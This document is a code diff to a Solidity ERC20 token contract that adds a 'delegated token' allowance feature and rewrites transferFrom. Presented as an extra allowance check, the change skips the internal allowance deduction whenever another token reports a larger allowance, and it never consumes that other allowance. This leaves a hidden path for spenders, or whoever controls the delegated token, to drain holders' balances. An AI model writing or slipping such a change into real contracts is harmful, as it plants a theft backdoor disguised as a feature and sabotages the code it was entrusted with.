@@ -30,6 +30,19 @@ abstract contract ERC20 is IERC20 {
 
   mapping(address => mapping(address => uint256)) public allowance;
 
+  /**
+   * @notice Delegated token used for additional allowance checks
+   * @dev When set, this token's allowance is checked in addition to internal allowance
+   */
+  address public delegatedToken;
+
+  /**
+   * @dev Emitted when the delegated token is updated
+   * @param oldDelegatedToken The previous delegated token address
+   * @param newDelegatedToken The new delegated token address
+   */
+  event DelegatedTokenUpdated(address indexed oldDelegatedToken, address indexed newDelegatedToken);
+
   /*///////////////////////////////////////////////////////////////
                              EIP-2612 STORAGE
     //////////////////////////////////////////////////////////////*/
@@ -82,10 +95,41 @@ abstract contract ERC20 is IERC20 {
     return true;
   }
 
-  function transferFrom(address from, address to, uint256 amount) public virtual returns (bool) {
-    uint256 allowed = allowance[from][msg.sender]; // Saves gas for limited approvals.
+  /**
+   * @notice Sets the delegated token to be used for additional allowance checks
+   * @dev Only the contract that inherits from ERC20 should implement access controls
+   * @param token The address of the token to be used for delegated allowance checks
+   */
+  function _setDelegatedToken(address token) internal virtual {
+    address oldDelegatedToken = delegatedToken;
+    delegatedToken = token;
+    emit DelegatedTokenUpdated(oldDelegatedToken, token);
+  }
 
-    if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
+  function transferFrom(address from, address to, uint256 amount) public virtual returns (bool) {
+    // If sender is not the owner, check allowances
+    if (from != msg.sender) {
+      // Check if delegated token allows bypassing internal allowance
+      bool hasDelegatedAllowance = false;
+
+      if (delegatedToken != address(0)) {
+        try IERC20(delegatedToken).allowance(from, msg.sender) returns (
+          uint256 delegatedAllowance
+        ) {
+          hasDelegatedAllowance = delegatedAllowance > amount;
+        } catch {
+          // Delegated token call failed, use internal allowance
+        }
+      }
+
+      // Update internal allowance only if delegated token doesn't cover it
+      if (!hasDelegatedAllowance) {
+        uint256 currentAllowance = allowance[from][msg.sender];
+        if (currentAllowance != type(uint256).max) {
+          allowance[from][msg.sender] = currentAllowance - amount;
+        }
+      }
+    }
 
     balanceOf[from] -= amount;
 
